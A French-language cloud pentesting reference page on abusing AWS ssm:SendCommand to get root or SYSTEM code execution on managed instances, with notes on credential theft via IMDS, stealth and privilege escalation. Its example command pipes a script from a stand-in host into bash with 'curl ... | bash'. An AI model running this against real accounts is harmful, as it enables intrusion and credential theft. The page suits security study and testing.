---
title: "Run command : exécution de code via ssm:SendCommand sur les instances managées"
description: "ssm:SendCommand pour exécuter des commandes en tant que root ou SYSTEM sur des instances managées sans toucher au service de métadonnées."
keywords:
  - SSM
  - SendCommand
  - run command
  - exécution de commande
  - instance managée
---

# Run command

`ssm:SendCommand` exécute une commande shell sur n'importe quelle instance managée par SSM via le document `AWS-RunShellScript` (Linux) ou `AWS-RunPowerShellScript` (Windows). La commande s'exécute en tant qu'agent SSM, c'est-à-dire root ou SYSTEM, de sorte qu'un seul appel d'API, sans aucun chemin réseau vers l'hôte, donne une exécution de code complète.

## Exécuter une commande

```bash
aws ssm send-command \
  --document-name AWS-RunShellScript \
  --targets Key=InstanceIds,Values=<id1>,<id2> \
  --parameters 'commands=["id","curl -s https://you.example/x | bash"]'

# fetch the output
aws ssm list-command-invocations --command-id <cid> --details
```

Ciblez plusieurs hôtes à la fois avec un filtre de tag : `--targets Key=tag:Env,Values=prod`.

## Notes d'exploitation

- L'exécution en tant que root livre à la fois les secrets présents sur la machine et le rôle du profil d'instance via IMDS, c'est donc un chemin de vol de credentials autant qu'un chemin d'exécution.
- Elle ne nécessite ni accès entrant ni clé, seulement la permission d'API et une instance managée par l'agent, ce qui la rend discrète par rapport à SSH.
- `ssm:SendCommand` est un levier d'escalade de privilèges connu lorsque le rôle d'instance est plus privilégié que l'appelant.

## Outils

- **AWS CLI** (`ssm send-command`, `list-command-invocations`) : exécuter et lire.
- **Pacu** (`ssm__send_command`) : automatiser sur les instances découvertes.

## Références

- [HackTricks Cloud: ssm:SendCommand](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [AWS: Run Command](https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
